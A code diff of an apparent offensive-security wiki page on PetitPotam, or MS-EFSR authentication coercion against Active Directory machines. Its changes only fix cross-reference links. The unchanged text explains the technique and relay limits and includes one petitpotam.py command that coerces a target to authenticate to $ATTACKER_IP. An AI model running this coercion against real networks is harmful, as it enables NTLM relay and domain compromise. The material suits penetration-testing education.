@@ -6,7 +6,7 @@ MS-EFSR is Microsoft's Encrypting File System Remote protocol. It performs maint
 
 In 2019, Google's Project Zero research team found and reported a bug on MS-EFSR that could be combined with a [NTLM Reflection attack](https://bugs.chromium.org/p/project-zero/issues/detail?id=222) leading to a Local Privilege Elevation. An insufficient path check in MS-EFSR's `EfsRpcOpenFileRaw` method allowed attackers to force the `SYSTEM` account into creating an executable file of the attacker's choosing, hence providing the attacker with local admin rights.
 
-While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Lionel GILLES](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication. **The coerced authentications are made over SMB**. But MS-EFSR abuse can be combined with [WebClient abuse](broken-reference) to elicit incoming authentications made over HTTP which heightens [NTLM relay](broken-reference) capabilities.
+While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Lionel GILLES](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication. **The coerced authentications are made over SMB**. But MS-EFSR abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../ntlm/relay.md) capabilities.
 
 The following MS-EFSR's methods were detected vulnerable
 
@@ -28,7 +28,7 @@ petitpotam.py -method AddUsersToFile $TARGET_IP '\\$ATTACKER_IP\share\foo'
 ```
 
 {% hint style="info" %}
-**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilities of [NTLM relay](broken-reference). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
+**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilities of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
 {% endhint %}
 
 {% hint style="success" %}
